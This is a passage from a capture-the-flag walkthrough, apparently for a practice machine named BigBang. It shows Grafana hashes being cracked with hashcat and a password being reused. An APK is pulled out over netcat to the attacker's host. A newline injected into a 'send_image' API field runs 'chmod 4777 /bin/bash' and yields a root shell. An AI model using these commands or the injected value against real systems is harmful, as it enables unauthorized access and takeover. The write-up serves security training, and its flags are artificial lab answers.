-rw-r--r-- 1 shawking shawking  220 Jun  1  2024 .bash_logout
-rw-r--r-- 1 shawking shawking 3799 Jun  6  2024 .bashrc
drwx------ 2 shawking shawking 4096 Jun  1  2024 .cache
drwx------ 3 shawking shawking 4096 Jun  6  2024 .gnupg
drwxrwxr-x 3 shawking shawking 4096 Jun  6  2024 .local
-rw-r--r-- 1 shawking shawking  807 Jun  1  2024 .profile
drwx------ 3 shawking shawking 4096 Jun  6  2024 snap
-rw-r----- 1 root     shawking   33 Jan 26 16:56 user.txt
```

```c
shawking@bigbang:/opt/data$ cat grafana.db
<--- CUT FOR BREVITY --->
admin@localhost
441a715bd788e928170be7954b17cb19de835a2dedfdece8c65327cb1d9ba6bd47d70edb7421b05d9706ba6147cb71973a34CFn7zMsQpfCgJll8Bmss
<--- CUT FOR BREVITY --->
George Hubble
7e8018a4210efbaeb12f0115580a476fe8f98a4f9bada2720e652654860c59db93577b12201c0151256375d6f883f1b8d9604umebBJucv0Whk1JNfa3
<--- CUT FOR BREVITY --->
```

## Privilege Escalation to developer

### Cracking the Hash

With `grafana2hashcat` we formatted the `hashes` to the `hashcat` matching format.

- [https://github.com/iamaldi/grafana2hashcat](https://github.com/iamaldi/grafana2hashcat)

```c
┌──(kali㉿kali)-[/media/…/Machines/BigBang/files/grafana2hashcat]
└─$ cat hashes.txt 
441a715bd788e928170be7954b17cb19de835a2dedfdece8c65327cb1d9ba6bd47d70edb7421b05d9706ba6147cb71973a34,CFn7zMsQpf,CgJll8Bmss
7e8018a4210efbaeb12f0115580a476fe8f98a4f9bada2720e652654860c59db93577b12201c0151256375d6f883f1b8d960,4umebBJucv,0Whk1JNfa3
```

```c
┌──(kali㉿kali)-[/media/…/Machines/BigBang/files/grafana2hashcat]
└─$ python3 grafana2hashcat.py hashes.txt -o hashcat_hashes.txt

[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  hashes.txt
[+] Done! Read 2 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[+] Writing output to 'hashcat_hashes.txt' file.
[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt
```

After a few seconds the first `hash` of `George Hubble` cracked.

```c
┌──(kali㉿kali)-[/media/…/Machines/BigBang/files/grafana2hashcat]
└─$ hashcat -m 10900 hashcat_hashes.txt --wordlist /usr/share/wordlists/rockyou.txt   
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i9-10900 CPU @ 2.80GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

sha256:10000:NHVtZWJCSnVjdg==:foAYpCEO+66xLwEVWApHb+j5ik+braJyDmUmVIYMWduTV3sSIBwBUSVjddb4g/G42WA=:bigbang
Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework
```

| Password |
| -------- |
| bigbang  |

### Password Re-use

Through `password re-use` we were able to `escalate our privileges` to `developer`.

```c
shawking@bigbang:~$ su developer
Password: 
developer@bigbang:/home/shawking$
```

| Username  | Password |
| --------- | -------- |
| developer | bigbang  |

## Pivoting (developer)

We performed our usual steps of `enumeration` and `pivoting` and found a folder called `android` inside the `home directory` of `developer`.

```c
developer@bigbang:~$ id
uid=1002(developer) gid=1002(developer) groups=1002(developer)
```

```c
developer@bigbang:~$ sudo -l
[sudo] password for developer: 
Sorry, user developer may not run sudo on bigbang.
```

```c
developer@bigbang:~$ ls -la
total 28
drwxr-x--- 4 developer developer 4096 Jan 17 11:38 .
drwxr-xr-x 4 root      root      4096 Jun  5  2024 ..
drwxrwxr-x 2 developer developer 4096 Jun  7  2024 android
lrwxrwxrwx 1 root      root         9 Jan 17 11:38 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  220 Jun  1  2024 .bash_logout
-rw-r--r-- 1 developer developer 3771 Jun  1  2024 .bashrc
drwx------ 2 developer developer 4096 Jun  6  2024 .cache
-rw-r--r-- 1 developer developer  807 Jun  1  2024 .profile
```

It contained a file called `stellite-app.apk`.

```c
developer@bigbang:~/android$ ls -la
total 2424
drwxrwxr-x 2 developer developer    4096 Jun  7  2024 .
drwxr-x--- 4 developer developer    4096 Jan 17 11:38 ..
-rw-rw-r-- 1 developer developer 2470974 Jun  7  2024 satellite-app.apk
```

We downloaded the file for further investigation and probably to `reverse engineer` it.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/BigBang/files]
└─$ nc -lnvp 9999 > satellite-app.apk
listening on [any] 9999 ...
```

```c
developer@bigbang:~/android$ nc 10.10.14.226 9999 < satellite-app.apk
```

## Investigating APK

We unpacked the `.apk` file using `apktool`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/BigBang/files]
└─$ apktool d satellite-app.apk 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.7.0-dirty on satellite-app.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

We were able to extract another `VHOST` entry and with port `9090/TCP` a hint for our next step from the files.

```c
┌──(kali㉿kali)-[/media/…/Machines/BigBang/files/satellite-app]
└─$ grep -R 9090 *
smali/q0/b.smali:    const-string v3, "http://app.bigbang.htb:9090/command"
smali/u/f.smali:    const-string v9, "http://app.bigbang.htb:9090/command"
smali/u/f.smali:    const-string v9, "http://app.bigbang.htb:9090/login"
```

A quick look at the `locally` running `ports` showed `9090/TCP` as open.

```c
developer@bigbang:~$ ss -tulpn
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                   
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                              0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:42483                                           0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                          172.17.0.1:3306                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                             0.0.0.0:80                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                            127.0.0.1:9090                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:3000                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                                [::]:80                                                 [::]:*                                                
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*
```

The `process list` revealed that on this port the user `root` was running `/satellite/app.py`.

```c
developer@bigbang:~$ ps auxf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
<--- CUT FOR BREVITY --->
root        1756  0.0  1.7 246812 71124 ?        Ssl  16:56   0:03 /usr/bin/python3 /root/satellite/app.py
shawking    2068  0.0  0.2  17092  9564 ?        Ss   17:02   0:01 /lib/systemd/systemd --user
shawking    2069  0.0  0.0 169404  3780 ?        S    17:02   0:00  \_ (sd-pam)
develop+    4388  0.0  0.2  17092  9692 ?        Ss   17:50   0:00 /lib/systemd/systemd --user
develop+    4389  0.0  0.0 169364  3840 ?        S    17:50   0:00  \_ (sd-pam)
```

## Interacting with app.bigbang.htb

We forwarded port `9090/TCP` using `SSH` in order to interact with the `application`.

```c
┌──(kali㉿kali)-[~]
└─$ ssh -L 9090:127.0.0.1:9090 developer@10.129.77.135
developer@10.129.77.135's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jan 26 05:48:24 PM UTC 2025

  System load:           0.35
  Usage of /:            63.6% of 9.74GB
  Memory usage:          25%
  Swap usage:            0%
  Processes:             180
  Users logged in:       1
  IPv4 address for eth0: 10.129.77.135
  IPv6 address for eth0: dead:beef::250:56ff:fe94:c5a9


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jan 26 17:48:25 2025 from 10.10.14.226
developer@bigbang:~$
```

After that we used `d2j-dex2jar` in order to open the `sattelite-app.apk` as `.jar` file using `jadx-gui`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/BigBang/files]
└─$ d2j-dex2jar satellite-app.apk 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
dex2jar satellite-app.apk -> ./satellite-app-dex2jar.jar
Detail Error Information in File ./satellite-app-error.zip
Please report this file to one of following link if possible (any one).
    https://sourceforge.net/p/dex2jar/tickets/
    https://bitbucket.org/pxb1988/dex2jar/issues
    https://github.com/pxb1988/dex2jar/issues
    dex2jar@googlegroups.com
```

In the `source code` we found the commands we needed to interact with the application.

![](images/2025-01-26_19-47_app_command.png)

![](images/2025-01-26_19-49_app_command_send_image.png)

And so we started with the `/command` endpoint to get the information that we needed to `authenticate`.

```c
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://localhost:9090/command
{"msg":"Missing Authorization Header"}
```

We logged in to receive the `token` which we needed for the `authentication`.

```c
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://localhost:9090/login -H "Content-Type: application/json" --data '{"username":"developer", "password":"bigbang"}'
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkxNTAzNywianRpIjoiODFmNzIwNGMtMzM5YS00MjY4LTg0MTktNWViM2UzMWE3NTg5IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzkxNTAzNywiY3NyZiI6IjhiYjJiOTBmLWM0OGEtNDE0Yy04YTMyLWFmYTQ1YmFiYWZmZSIsImV4cCI6MTczNzkxODYzN30.JtPVLTwE7Q2_Jb5NyYmUfLgUS9ywSJr00ztyFRZALDc"}
```

```c
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://localhost:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkxNTAzNywianRpIjoiODFmNzIwNGMtMzM5YS00MjY4LTg0MTktNWViM2UzMWE3NTg5IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzkxNTAzNywiY3NyZiI6IjhiYjJiOTBmLWM0OGEtNDE0Yy04YTMyLWFmYTQ1YmFiYWZmZSIsImV4cCI6MTczNzkxODYzN30.JtPVLTwE7Q2_Jb5NyYmUfLgUS9ywSJr00ztyFRZALDc" --data '{"username":"developer", "password":"bigbang"}'
{"error":"Invalid command"}
```

With the `token` we made our way to the `move` command and provided some `coodinates` to get our `command` accepted.

```c
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://localhost:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkxNTAzNywianRpIjoiODFmNzIwNGMtMzM5YS00MjY4LTg0MTktNWViM2UzMWE3NTg5IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzkxNTAzNywiY3NyZiI6IjhiYjJiOTBmLWM0OGEtNDE0Yy04YTMyLWFmYTQ1YmFiYWZmZSIsImV4cCI6MTczNzkxODYzN30.JtPVLTwE7Q2_Jb5NyYmUfLgUS9ywSJr00ztyFRZALDc" --data '{"command":"move","x":"1","y":"2","z":"3"}'
{"status":"developer is moving to coordinates (1.0, 2.0, 3.0)"}
```

After a few tests we were sure that we were looking for some sort of `command injection`.

```c
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://localhost:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkxNTAzNywianRpIjoiODFmNzIwNGMtMzM5YS00MjY4LTg0MTktNWViM2UzMWE3NTg5IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzkxNTAzNywiY3NyZiI6IjhiYjJiOTBmLWM0OGEtNDE0Yy04YTMyLWFmYTQ1YmFiYWZmZSIsImV4cCI6MTczNzkxODYzN30.JtPVLTwE7Q2_Jb5NyYmUfLgUS9ywSJr00ztyFRZALDc" --data '{"command":"move","x":"111111111111111111111111111111111111111","y":"2","z":"3"}'
{"status":"developer is moving to coordinates (1.111111111111111e+38, 2.0, 3.0)"}
```

```c
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://localhost:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkxNTAzNywianRpIjoiODFmNzIwNGMtMzM5YS00MjY4LTg0MTktNWViM2UzMWE3NTg5IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzkxNTAzNywiY3NyZiI6IjhiYjJiOTBmLWM0OGEtNDE0Yy04YTMyLWFmYTQ1YmFiYWZmZSIsImV4cCI6MTczNzkxODYzN30.JtPVLTwE7Q2_Jb5NyYmUfLgUS9ywSJr00ztyFRZALDc" --data '{"command":"move","x":"1111111111111111111111111111111111111111","y":"2","z":"3"}'
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

## Privilege Escalation to root

### Command Injection

The `send_image` command offered us to `write` to a `file` on `disk`. We abuse that to `send` a `command` in a `newline` and set the `SUID` bit on `/bin/bash`.

```c
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://localhost:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkxNTAzNywianRpIjoiODFmNzIwNGMtMzM5YS00MjY4LTg0MTktNWViM2UzMWE3NTg5IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzkxNTAzNywiY3NyZiI6IjhiYjJiOTBmLWM0OGEtNDE0Yy04YTMyLWFmYTQ1YmFiYWZmZSIsImV4cCI6MTczNzkxODYzN30.JtPVLTwE7Q2_Jb5NyYmUfLgUS9ywSJr00ztyFRZALDc" --data '{"command":"send_image", "output_file": "aaa \n chmod 4777 /bin/bash"}'
{"error":"Error reading image file: [Errno 2] No such file or directory: 'aaa \\n chmod 4777 /bin/bash'"}
```

```c
developer@bigbang:~$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1396520 Mar 14  2024 /bin/bash
```

```c
developer@bigbang:~$ /bin/bash -p
bash-5.1#
```

## root.txt

```c
bash-5.1# cat root.txt
545ab02aec7791e6d2258d8d77b25eec
```
